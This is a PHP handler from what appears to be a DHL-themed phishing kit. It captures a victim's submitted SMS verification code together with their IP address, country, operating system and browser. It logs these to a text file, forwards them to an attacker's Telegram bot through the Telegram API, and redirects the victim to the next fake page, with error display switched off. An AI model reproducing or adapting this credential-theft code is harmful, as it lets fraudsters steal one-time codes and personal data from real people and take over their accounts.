<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../LBRAD/911.php');
include('../LBRAD/COUNTRY.php');
include('../LBRAD/SYS.php');
include('../LBRAD/TELEGRMAT.php');

if (isset($_POST)) {
    $message = "* +---+SMS-DHL-2-BY-DNG+---+\n";
    $message .= "* SMS-2: " . $_POST['sm'] . "\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../Loa1.php?Dsir=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
